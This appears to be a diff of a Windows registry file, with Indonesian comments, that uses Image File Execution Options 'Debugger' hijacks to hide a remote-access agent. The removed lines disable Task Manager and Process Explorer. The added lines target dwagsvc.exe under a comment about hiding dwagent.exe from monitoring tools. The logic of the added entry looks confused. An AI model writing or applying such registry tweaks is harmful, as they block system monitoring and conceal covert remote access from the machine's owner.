@@ -1,13 +1,7 @@
-hi@kdandy.com Version 1.0
+Windows Registry Editor Version 5.00
 
-; Menyembunyikan proses dari Task Manager dan Process Explorer
-[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe]
-"Debugger"="svchost.exe"
-
-[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp.exe]
-"Debugger"="svchost.exe"
-
-[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp64.exe]
+; Menyembunyikan dwagent.exe dari monitoring tools
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dwagsvc.exe]
 "Debugger"="svchost.exe"
 
 ; Menyembunyikan service dari Services.msc
